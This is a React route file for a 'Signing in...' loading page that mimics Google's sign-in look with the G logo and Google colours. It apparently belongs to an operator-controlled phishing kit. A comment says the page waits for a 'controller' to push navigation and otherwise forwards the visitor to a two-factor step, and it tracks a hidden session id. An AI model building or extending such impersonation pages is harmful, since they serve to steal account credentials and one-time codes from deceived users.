import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";
import { GoogleGLogo, GE_FONT_FAMILY, GeFontStyle, useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({ meta: [{ title: "Signing in..." }] }),
  component: GeLoadingPage,
});

function GeLoadingPage() {
  const { sessionId, geNavigate, isObserve } = useGeTracking();

  useEffect(() => {
    if (isObserve) return;
    // Idle here until controller pushes navigation; auto-advance to 2fa after a delay as fallback
    const t = setTimeout(() => geNavigate("/ge/twofa"), 3500);
    return () => clearTimeout(t);
  }, [isObserve, geNavigate]);

  return (
    <div style={{
      minHeight: "100vh",
      background: "#F0F4F9",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: GE_FONT_FAMILY,
      color: "#1f1f1f",
    }}>
      <GeFontStyle />
      <style>{`
        @keyframes ge-spin { to { transform: rotate(360deg); } }
        @media (prefers-color-scheme: dark) {
          .ge-loading-page { background: #1E1F20 !important; color: #e3e3e3 !important; }
          .ge-loading-ring { border-color: rgba(168,199,250,0.25) !important; border-top-color: #A8C7FA !important; }
        }
      `}</style>
      <div className="ge-loading-page" style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 24 }}>
        <GoogleGLogo size={56} />
        <div
          className="ge-loading-ring"
          style={{
            width: 44,
            height: 44,
            border: "4px solid rgba(11,87,208,0.15)",
            borderTopColor: "#0B57D0",
            borderRadius: "50%",
            animation: "ge-spin 0.9s linear infinite",
          }}
        />
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </div>
  );
}
